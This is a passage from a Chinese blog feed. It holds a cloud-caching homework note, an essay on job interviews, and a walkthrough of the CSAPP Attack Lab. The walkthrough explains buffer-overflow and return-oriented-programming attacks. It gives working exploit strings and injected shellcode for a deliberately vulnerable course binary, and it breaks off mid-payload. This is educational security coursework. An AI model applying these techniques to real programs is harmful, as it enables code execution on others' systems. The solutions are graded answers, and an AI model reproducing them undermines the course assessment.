<li>具体的请求在 <code>retrieveDetail</code> 函数中完成</li>
</ol>
<p>所以具体来说，要做好的是以下四个事情：</p>
<ol>
<li>确定缓存所使用的数据结构</li>
<li>确定缓存替换记录的策略</li>
<li>确定需要缓存多少请求</li>
<li>确定两个 data center 的访问策略</li>
</ol>
<p>基本上做好这四个事情，就算是完成任务了。修改完成之后可以把文件传回服务器 <code>scp -r ./MSB.java ubuntu@yourdns.eastus.cloudapp.azure.com:~/vertx/</code></p>
<p>AWS 部分改动不多，改一下 data center 的地址就好，上传的代码为：<code>scp -i demo.pem ./MSB.java ubuntu@dns.compute-1.amazonaws.com:~/</code>，然后 ssh 过去运行 <code>ssh -i demo.pem ubuntu@dns.compute-1.amazonaws.com</code></p>
<p>这次的作业比较简单，希望以后也能这么开心。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>前面我们已经了解了如何进行 autoscaling 和自定义负载均衡器，这一课我们来接触另一个在 web 服务中非常重要的概念——缓存。</p>]]>
    
    </summary>
    
      <category term="AWS" scheme="http://wdxtub.com/tags/AWS/"/>
    
      <category term="Azure" scheme="http://wdxtub.com/tags/Azure/"/>
    
      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
    
      <category term="云计算" scheme="http://wdxtub.com/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
    
      <category term="缓存" scheme="http://wdxtub.com/tags/%E7%BC%93%E5%AD%98/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[编程起跑线 番外 技术面试感悟]]></title>
    <link href="http://wdxtub.com/2016/02/14/interview-guide/"/>
    <id>http://wdxtub.com/2016/02/14/interview-guide/</id>
    <published>2016-02-14T23:25:08.000Z</published>
    <updated>2016-02-15T03:24:45.000Z</updated>
    <content type="html"><![CDATA[<p>本文属于不务正业及歪门邪道，没有太多判断力的同学请不要点开或立即关闭本页面。</p>
<a id="more"></a>
<hr>
<h2 id="u7F18_u8D77"><a href="#u7F18_u8D77" class="headerlink" title="缘起"></a>缘起</h2><p>去年确定要回国之后，基本已经停止了投简历和刷题。这两天完成了（可能是）最后一次 onsite 面试，连续飞来飞去，身心俱疲，但是能免费出去玩，见见朋友聊聊天，还是值得去感受下的。</p>
<p>从去年九月开始，到现在也算是找了小半年工作了，除了一开始什么都不懂有些迷茫之外，整个过程基本处于可控的状态，从前期的找节奏热身，到后面针对性去考察不同公司，可以说还都是比较顺利的。因为我的动机和大部分人不一样，所以这里谈及的所有，很可能对另一个人没有任何可操作性，当然，如果你对一个『奇葩』的思路和做法感兴趣，请继续。</p>
<p>借用知乎体，问为什么之前先要问是什么，于是问题来了：什么是面试？什么是找工作？</p>
<p>狭义来说，找工作面试类似于从学生到社会人身份转换的认证考试，考试成绩可能和工资公司职位有关。但一切认证考试背后的目的是对应的能力，比方说考驾照，背后对应的是驾驶车辆，判断路况以及做出最佳选择的能力。那么在找工作面试这件事儿上，所需的能力是什么呢？</p>
<p>简单来说八个字：观察、思考、沟通、行动。</p>
<p>观察不只是看题，更是审时度势说什么不说什么；思考不只是算法，更是逻辑和知识框架的建立；沟通不只是套近乎，更是因势利导去了解对方的思维模式；行动不只是刷题，更是通过试错和改进让自己更快完成身份转换。</p>
<p>当然，刷题也没什么错，但是不要用战术上的勤奋掩饰战略上的懒惰，道理都懂，我不多说。不过如果连我前面在说什么都看不懂的话，还是老老实实刷题吧。</p>
<p>我还记得小时候刚开始学英语的时候，面对一个一个不知所云的单词时的无助（当然 GRE 考试我也有这个感觉）。但是这些跟找工作相比（其实具体指对应的能力），就太九牛一毛了。那些可以量化的指标往往都是清晰的，难易暂且不说，但是至少我们有终点，也有起点。</p>
<p>可是对于那些直觉类的能力，由于悟道时间的不确定，我们唯一能做的就是不断坚持修炼直到开化的那天。</p>
<p>从这个角度来说，面试就是一个学习的过程，一个公司专门找五六个人陪你聊天帮你成长，不但不收钱还报销一切费用，难道还有更好的事情嘛？就用这么好的机会来刷刷题，难道不觉得很浪费嘛？</p>
<p>对于半只脚踏入社会的毕业生来说，重要的是尽一切可能去汲取那些在学校里无法获取的知识和经验，当然，结果也重要，不过如果你能在这个过程中学到足够多的东西，结果反而是水到渠成的事情，不必过多担心。</p>
<h2 id="u6B66_u5668"><a href="#u6B66_u5668" class="headerlink" title="武器"></a>武器</h2><p>就我的感觉来看，简历在没被刷掉之后，作用就基本等于零了。除非参与过一些举世闻名的项目，或者刚好和面试官的领域吻合，不然说真的没人在意。假如硬要说面试官会在面试的时候看，这都面对面了，直接跟他介绍自己不就得了嘛。</p>
<p>当然这不是说简历不重要，简历重要性在于做简历。要知道每往上面加哪怕一条记录，都需要大量的努力，这些背后的一点一滴，才是简历的价值，然后价值决定价格，价格会浮动，不要因为一点浮动就恐慌性抛售，沉住气，闷声发大财。</p>
<p>整个找工作过程中，一定要慢慢形成适合自己的合理的思维模式。在学校里，只要足够努力，很多时候都能取得比较好的成绩，但是在步入社会的过程中，或多或少会有迷茫无助的时刻，感觉自己已经刷了很多题目，很认真准备了简历，为什么还是屡战屡败。</p>
<p>但反过来看，这其实是一个很好的强迫自己去审视自己的机会，看看自己那一步出了问题，然后对应去调整，再根据新的反馈来继续调整，这其实就是面对没有标准解答的问题的时候的最佳实践。就好像机器学习里，有正样本，也有负样本，只有综合考虑运用，才能得到最佳的学校效果。</p>
<p>一旦有了这种思维，那么飞花落叶皆可伤人，比方说刷题，其实意义很大吗？不大，但是如果接着找工作的压力，检查去做，并从中验证和改进自己的学习和理解能力，那意义就大了。所谓努力，不应该只是战术上的，更应该是战略上的，而时不时停下来，审视自己之前的工作和方向，并根据观察和反馈设定下一阶段的目标，则是很重要的战略努力。</p>
<p>就像大侠最重要的不是武器，而是『勇气、侠义、爱与宽容』一样（古龙先生语），学习最重要的不是知识点，而是『学会学习与学会解决问题』。仔细想想，如果感觉自己因为所谓的『目标』而跑偏的话，那么现在回头，还是来得及的。</p>
<h2 id="u62DB_u5F0F"><a href="#u62DB_u5F0F" class="headerlink" title="招式"></a>招式</h2><p>不同公司的文化不同，风格不同，技术倾向不同，人员组成不同，千奇百怪组合起来，就像武林中的各个门派一样。江湖中有通用的功夫吗？并没有！所以见招拆招就很重要了。当然，有些门派就是天生不适合，那也不必强求，要知道，那些想一统武林的人，通常都没有什么好下场。</p>
<p>不过门派虽多，还是有规律可寻。招式的变化终究是有穷尽的，兵器的变化其实也不多，本来想多实地考察几个公司学百晓生写个兵器谱，但是东岸西岸飞一次要老命，前两天的红眼航班让我彻底放弃了这个念头，于是这个部分就随心写一下。</p>
<p>总体来说，无论大公司小公司，算法题基本就是主要沟通方式了，毕竟其他也没有什么好说的，毕竟面得多，可能一开始比较有激情，后面对着面试者，面试官更多就是打个卡了。</p>
<p>大公司制度严明，一开始就会告诉你所有的安排，接下来就是按部就班完成；小公司比较随意，谁有空谁来面，每次面多久也基本没有稳定值，最近去湾区一家小公司一口气面了 7 轮，真是『想要逃』，想大喊一声『老子就这么屌我们不要废话了爱要要不要拉倒』，恩我也就是想想而已。</p>
<p>打戏，要拍得好看，一定要有来有往，面试也一样，不能因为是求职的一方，就先自降一等，不卑不亢，该说什么说什么，为了一份工作，真不值得放弃更重要的东西。</p>
<p>偷懒地说，面试官有两种，大部分都是第一种，只有很少是第二种。第一种就是心中有题目也有答案，你没说出他想要的答案，那就是不行。第二种是心中有题目，但没有答案，会和你一起『努力』去解决一个问题。</p>
<p>第一种算是比较没有诚意的（当然还可以更没有诚意，这里就不提了），在网上找个题目看看答案然后心里只有标准答案，这样真的有很大意义吗？我觉得稍微学过一点计算机的，都可以做到，当然，毕竟有一定的工作经验，但是就这样似乎『事不关己』等待面试者给出正确答案，可能给出的评价也没有多少参考价值吧。遇到第二种面试官，整个面试过程变成了一个完美的大型互动教学活动，只能说好好珍惜，能学到很多有用的东西。</p>
<p>什么才是好的面试题目呢？当然是根据自己平时工作的场景，抽象成比较简单的设计+编码题，不需要太难，但是可以综合考察到面试者思考问题的角度以及对计算机学科的理解，最后的编码可以了解算法能力。最好可以带一点新概念，这样还能考察面试者的快速学习和理解能力。当然还有很多值得考察的角度，不过都比较花心思，估计大部分打卡型面试官，是不会这样的，所以大家还是可以放心刷题。</p>
<h2 id="u79D8_u7B08"><a href="#u79D8_u7B08" class="headerlink" title="秘笈"></a>秘笈</h2><p>写到这我有点累了。但是还是要厕所里挂钟——有始有终。</p>
<p>如何看人还是要向老祖宗取经，这里推荐一本书《冰鉴》，不要看译注版本（里面举得例子很多比较牵强）。</p>
<p>试探的话有以下方法，这里就不展开了：</p>
<ul>
<li>故意写错比较关键但是不大容易发现的小失误，看面试官能否及时指出</li>
<li>故意写错比较关键的地方，但是精心设计几个看似合理但其实是『陷阱测试用例』，看看面试官能不能自己绕出逻辑陷阱（递归中这个方法很好用）</li>
<li>摸清楚面试官擅长的领域，然后开始扯他不熟悉的领域，看他的表现（比如说扯一点汇编，扯一点硬件）</li>
<li>写完一个解法之后问问面试官有没有什么优化的方法，如果他说有，问他怎么有，如果他说没有，你就给出一个优化的方法</li>
<li>其他很多…自行发挥创意</li>
</ul>
<p>当然这些慎用，装逼有风险，起手需谨慎。</p>
<h2 id="u91D1_u76C6"><a href="#u91D1_u76C6" class="headerlink" title="金盆"></a>金盆</h2><p>总结一下就是，还是要把时间用在更有意义的地方。</p>
<p>很多内容文章里只能点到为止，想要详细了解的同学可以趁我还在匹兹堡（目测五月中下旬走）的时候约饭聊。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>本文属于不务正业及歪门邪道，没有太多判断力的同学请不要点开或立即关闭本页面。</p>]]>
    
    </summary>
    
      <category term="交流" scheme="http://wdxtub.com/tags/%E4%BA%A4%E6%B5%81/"/>
    
      <category term="人生" scheme="http://wdxtub.com/tags/%E4%BA%BA%E7%94%9F/"/>
    
      <category term="算法" scheme="http://wdxtub.com/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="面试" scheme="http://wdxtub.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[深入理解计算机系统 习题课 3 Attacklab]]></title>
    <link href="http://wdxtub.com/2016/02/14/csapp-lab3/"/>
    <id>http://wdxtub.com/2016/02/14/csapp-lab3/</id>
    <published>2016-02-14T22:45:14.000Z</published>
    <updated>2016-02-14T23:03:25.000Z</updated>
    <content type="html"><![CDATA[<p>这次的作业中，我们将要亲自上手利用漏洞来进行代码注入的攻击，听起来很刺激不是吗？</p>
<a id="more"></a>
<hr>
<h2 id="u603B_u4F53_u4ECB_u7ECD"><a href="#u603B_u4F53_u4ECB_u7ECD" class="headerlink" title="总体介绍"></a>总体介绍</h2><p>这一次我们将实现两种不同类型的攻击：</p>
<ul>
<li>缓冲区溢出攻击</li>
<li>ROP 攻击</li>
</ul>
<p>x86-64 架构的寄存器有一些使用习惯，比如：</p>
<p><img src="/images/14553978485119.jpg" alt=""></p>
<p>函数调用前需要把某些以后仍旧需要用到的值保存起来。</p>
<p>而对于 x86-64 的栈来说，栈顶的地址最小，栈底的地址最大，寄存器 <code>%rsp</code> 保存着指向栈顶的指针。栈支持两个操作：</p>
<ul>
<li><code>push %reg</code>：<code>%rsp</code> 的值减去 8，把寄存器 <code>%reg</code> 中的值放到 <code>(%rsp)</code> 中</li>
<li><code>pop %reg</code>：把寄存器 <code>(%rsp)</code> 中的值放到 <code>%reg</code> 中，<code>%rsp</code> 的值加上 8</li>
</ul>
<p>接下来需要了解的事情是，每个函数都有自己的栈帧(stack frame)，可以把它理解为每个函数的工作空间，保存着：</p>
<ul>
<li>本地变量</li>
<li>调用者和被调用者保存的寄存器里的值</li>
<li>其他一些函数调用可选的值</li>
</ul>
<p>如下图所示</p>
<p><img src="/images/14553985892568.jpg" alt=""></p>
<p>x86-64 的函数调用过程，需要做的设置有：</p>
<ul>
<li>调用者：<ul>
<li>为要保存的寄存器值及可选参数分配足够大控件的栈帧</li>
<li>把所有调用者需要保存的寄存器存储在帧中</li>
<li>把所有需要保存的可选参数按照逆序存入帧中</li>
<li><code>call foo:</code> 会先把 <code>%rip</code> 保存到栈中，然后跳转到 label <code>foo</code> </li>
</ul>
</li>
<li>被调用者<ul>
<li>把任何被调用者需要保存的寄存器值压栈减少 <code>%rsp</code> 的值以便为新的帧腾出空间</li>
</ul>
</li>
</ul>
<p>x86-64 的函数返回过程：</p>
<ul>
<li>被调用者<ul>
<li>增加 <code>%rsp</code> 的计数，逆序弹出所有的被调用者保存的寄存器，执行 <code>ret: pop %rip</code></li>
</ul>
</li>
</ul>
<p>有了上面的基础知识，我们大概就能明白，利用缓冲区溢出，实际上是通过重写返回值地址，来执行另一个代码片段，就是所谓代码注入了。比较关键的点在于</p>
<ul>
<li>熟悉 x86-64 约定俗成的用法</li>
<li>使用 <code>objdump -d</code> 来了解相关的偏移量</li>
<li>使用 <code>gdb</code> 来确定栈地址</li>
</ul>
<p>这之后，我们需要把需要注入的代码转换位字节码，这样机器才能执行，这里可以使用 <code>gcc</code> 和 <code>objdump</code> 来完成这个工作</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设 foo.s 是我们想要注入的代码</span></span><br><span class="line">vim foo.s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 gcc 生成对应的字节码 foo.o</span></span><br><span class="line">gcc -c foo.s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 objdump 来查看其内容，可以看到对应的字节码</span></span><br><span class="line">objdump <span class="operator">-d</span> foo.o | less</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后需要把十六进制代码转换成字符串这样我们可以写在程序里</span></span><br><span class="line">./hex2raw -i inputfile -o outputfile</span><br></pre></td></tr></table></figure>
<p>另一种攻击是使用 return-oriented programming 来执任意代码，这种方法在 stack 不可以执行或者位置随机的时候很有用。</p>
<p>这种方法主要是利用 gadgets 和 string 来组成注入的代码。具体来说是使用 <code>pop</code> 和 <code>mov</code> 指令加上某些常数来执行特定的操作。也就是说，利用程序已有的代码，重新组合成我们需要的东西，这样就绕开了系统的防御机制。</p>
<p>举个例子，一个代码片段如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span> *input)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line">    ...</span><br><span class="line">    <span class="built_in">strcpy</span> (buf, inputt;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假设我们这里想要把一个值 <code>0xBBBBBBBB</code> 弹出到 <code>%rbx</code> 中并且移动它到 <code>%rax</code> 中，我们找到下面两个 gadgets:</p>
<ul>
<li><code>address1: mov %rbx, %rax; ret</code></li>
<li><code>address2: pop %rbx; ret</code></li>
</ul>
<p><img src="/images/14554030733407.jpg" alt=""></p>
<p>所以在这里我们其实不需要关心如何在 buffer 中运行我们的代码，而只需要知道 buffer 的 size，从而改写返回地址，即可以利用程序中原有的代码进行我们的操作。</p>
<p>在这个例子中，因为 address2 中的代码是把栈顶的值弹出到 <code>%rbx</code> 中，所以执行的时候，就会把 <code>0xBBBBBBBB</code> 放到 <code>%rbx</code> 中，现在程序就指向 address1 了，然后就会继续执行 address1，也就达到我们的目的，把 <code>0xBBBBBBBB</code> 放到了 <code>%rax</code> 中。</p>
<p>那么问题来了，我们如何能找到想要的 gadget 呢？在这个试验中，提供了一个 <code>farm.c</code>，可以从这里找到我们需要的 gadgets。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c  farm.c</span><br><span class="line">objdump <span class="operator">-d</span> farm.o | less</span><br></pre></td></tr></table></figure>
<p>一些建议：</p>
<ul>
<li>注意寻找 <code>c3</code> 结尾的代码，因为这可以作为每个 gadget 的最后一句（也就是正常返回）</li>
<li>画出栈的图</li>
<li>注意字节的顺序 (little endian)</li>
</ul>
<h2 id="u51C6_u5907_u5DE5_u4F5C"><a href="#u51C6_u5907_u5DE5_u4F5C" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
<li>先下载好试验的压缩包，然后上传到学校的主机上：<code>scp target334.tar dawang@shark.ics.cs.cmu.edu:~/513</code></li>
<li>接着 ssh 过去：<code>ssh -X dawang@shark.ics.cs.cmu.edu</code></li>
<li>然后解压：<code>tar -xvf target334.tar</code></li>
</ul>
<p>然后就可以看到这次试验的『战场』了：</p>
<p><img src="/images/14554099850201.jpg" alt=""></p>
<p>大概介绍下每个文件的作用：</p>
<ul>
<li><code>ctarget</code>: 用来做代码注入攻击的程序</li>
<li><code>rtarget</code>: 用来做 ROP 攻击的程序</li>
<li><code>cookie.txt</code>: 一个 8 位的 16 进制代码，用来作为攻击的标识符</li>
<li><code>farm.c</code>: 用来找寻 gadget 的源文件</li>
<li><code>hex2raw</code>: 用来生成攻击字符串的程序</li>
</ul>
<p><code>ctarget</code> 和 <code>rtarget</code> 都会从标准输入中读取字符串，然后保存在一个大小为 <code>BUFFER_SIZE</code> 的 char 数组中（具体的大小每个人的程序都不大一样）。我们可以通过两次输入测试来看看程序具体的行为，一次是正常输入，第二次会输入超出 <code>BUFFER_SIZE</code> 个数的字符串。</p>
<p><img src="/images/14554110293851.jpg" alt="第一次"></p>
<p><img src="/images/14554110781316.jpg" alt="第二次"></p>
<p>所以我们要做的就是输入合理的字符串，来触发对应的操作。用于攻击的程序还可以做到</p>
<p><img src="/images/14554114722403.jpg" alt="这次即使尝试错误也不会扣分"></p>
<p>比较有用的是可以把输入放在文件里，这样就不用每次打一长串了。</p>
<p>有几点需要注意：</p>
<ul>
<li>输入的字符串中不能有 <code>0x0a</code>，因为这是 <code>\n</code> 的意思，遇到这个的话会提前结束输入</li>
<li><code>hex2raw</code> 每次需要输入一个 2 位的 16 进制编码，如果想要输出 0，那么需要写 00。想要转换 <code>0xdeadbeef</code>，需要传入 <code>ef be ad de</code>，因为是 little-endian 规则</li>
</ul>
<p>具体有 5 个任务，如下：</p>
<p><img src="/images/14554126934270.jpg" alt=""></p>
<h2 id="u7B2C_u4E00_u9636_u6BB5"><a href="#u7B2C_u4E00_u9636_u6BB5" class="headerlink" title="第一阶段"></a>第一阶段</h2><p>这一关中我们暂时还不需要注入新的代码，只需要让程序重定向调用某个方法就好。<code>ctarget</code> 的正常流程是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"NO explit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们要做的是调用程序中的另一个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Touch!: You called touch1()\n"</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是在 <code>getbuf()</code> 函数返回的时候，执行 <code>touch1()</code> 而不是返回 <code>test()</code>。下面是一些建议：</p>
<ul>
<li>本关所需要的所有信息都可以在 <code>ctarget</code> 的汇编代码中找到</li>
<li>具体要做的是把 <code>touch1</code> 的开始地址放到 <code>ret</code> 指令的返回地址中</li>
<li>注意字节的顺序</li>
<li>可以用 gdb 在 <code>getbuf</code> 的最后几条指令设置断点，来看程序有没有完成所需的功能</li>
<li>具体 <code>buf</code> 在栈帧中的位置是由 <code>BUFFER_SIZE</code> 决定的，需要仔细察看来进行判断</li>
</ul>
<p>接下来我们就开始解题。</p>
<p>首先是反编译成汇编代码：<code>objdump -d ctarget &gt; ctarget.txt</code></p>
<p>然后把这个文件传到本地方便查看：<code>scp dawang@shark.ics.cs.cmu.edu:~/513/target334/ctarget.txt ./</code></p>
<p>接下来我们需要确定 <code>getbuf</code> 到底创建了多大的缓冲区，检索 <code>getbuf</code>，代码如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000000040181c &#60;getbuf&#62;:&#10;  40181c:&#9;48 83 ec 28          sub    $0x28,%rsp&#10;  401820:&#9;48 89 e7             mov    %rsp,%rdi&#10;  401823:&#9;e8 88 02 00 00       callq  401ab0 &#60;Gets&#62;&#10;  401828:&#9;b8 01 00 00 00       mov    $0x1,%eax&#10;  40182d:&#9;48 83 c4 28          add    $0x28,%rsp&#10;  401831:&#9;c3                   retq   &#10;  401832:&#9;90                   nop&#10;  401833:&#9;90                   nop</span><br></pre></td></tr></table></figure>
<p>可以看到这里把 <code>%rsp</code> 移动了 <code>0x28</code>(40) 位，也就是说，我们的缓冲区有 40 位，再上面的四位就是原来正常需要返回到 <code>test</code> 的返回地址（注意看之前的栈帧图），我们要做的就是利用缓冲区溢出把这个返回地址改掉。</p>
<p>于是我们继续搜素，来看看 <code>touch1</code> 在哪里：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000401834 &#60;touch1&#62;:&#10;  401834:&#9;48 83 ec 08          sub    $0x8,%rsp&#10;  401838:&#9;c7 05 9a 3c 20 00 01 movl   $0x1,0x203c9a(%rip)        # 6054dc &#60;vlevel&#62;</span><br></pre></td></tr></table></figure>
<p>可以看到地址在 <code>0x401834</code> 这里，但是我们要凑够 8 位，就是 <code>0x00401834</code>，于是我们需要输入的字符串就可以是这样：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">34</span> <span class="number">18</span> <span class="number">40</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
<p>前四十位是啥都不重要，后面四位按照 little endian 的规则逆向填上地址就好（注意这里为了排版用了换行，实际上都应该在一行，用空格分开），这样就改写了属于原来的返回地址。</p>
<p>接着我们把这个字符文件转换成字节码 <code>./hex2raw &lt; p1.txt &gt; p1r.txt</code>，最后执行一下 <code>./ctarget -i p1r.txt</code>，就可以看到结果了：</p>
<p><img src="/images/14554180666014.jpg" alt="成功完成第一关"></p>
<p>从第一关我们就学到了如何利用缓冲区来调用另外的过程，接下来我们来看第二关。</p>
<h2 id="u7B2C_u4E8C_u9636_u6BB5"><a href="#u7B2C_u4E8C_u9636_u6BB5" class="headerlink" title="第二阶段"></a>第二阶段</h2><p>第二关中需要插入一小段代码，<code>ctarget</code> 中的 <code>touch2</code> 函数的 C 语言如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (val == cookie)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据代码就可以看出来，我们需要把自己的 cookie 作为参数传进去，这里需要把参数放到 <code>%rdi</code> 中，只使用 <code>ret</code> 来进行跳转。</p>
<p>所以第一步，我们先来写需要注入的代码(文件 p2.s)：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov $0x45374fee,%rdi # set my cookie as the first parameter&#10;pushq $0x401860&#10;ret</span><br></pre></td></tr></table></figure>
<p>这里首先把参数传入到 <code>%rdi</code> 寄存器中，然后把 <code>touch2</code> 函数的起始地址压入栈中，最后返回，这样就可以跳转到 <code>touch2</code>。然后转换成对应的机器码 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c p2.s</span><br><span class="line">objdump <span class="operator">-d</span> p2.o &gt; p2.byte</span><br></pre></td></tr></table></figure>
<p>得到 p2.byte 文件的内容是</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p2.o:     file format elf64-x86-<span class="number">64</span></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"><span class="number">0000000000000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>:	<span class="number">48</span> c7 c7 ee <span class="number">4f</span> <span class="number">37</span> <span class="number">45</span> mov    $<span class="number">0x45374fee</span>,%rdi</span><br><span class="line">   <span class="number">7</span>:	<span class="number">68</span> <span class="number">60</span> <span class="number">18</span> <span class="number">40</span> <span class="number">00</span>       pushq  $<span class="number">0x401860</span></span><br><span class="line">   c:	c3                   retq</span><br></pre></td></tr></table></figure>
<p>那么现在问题来了，我们要如何才能让机器开始执行这几行代码呢？简单，利用第一阶段的方式，跳转到缓冲区所在的位置即可，那么问题又来了，缓冲区的位置在哪里呢？这个就需要实际跑一次程序，用 gdb 查看了。</p>
<p>和上次的试验一样 <code>gdb ctarget</code> 开始调试，因为我想知道缓冲区从哪里开始，所以在 <code>getbuf</code> 中看看 <code>%rsp</code> 的值即可，我们在 <code>0x401828</code> 处设置断点，然后查看对应寄存器的值：</p>
<p><img src="/images/14554204273695.jpg" alt=""></p>
<p>可以看到 <code>%rsp</code> 指向的位置是 <code>0x5560f2d8</code>，这样我们就可以得到需要输入的字符串了：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 ee </span><br><span class="line"><span class="number">4f</span> <span class="number">37</span> <span class="number">45</span> <span class="number">68</span> </span><br><span class="line"><span class="number">60</span> <span class="number">18</span> <span class="number">40</span> <span class="number">00</span></span><br><span class="line">c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span 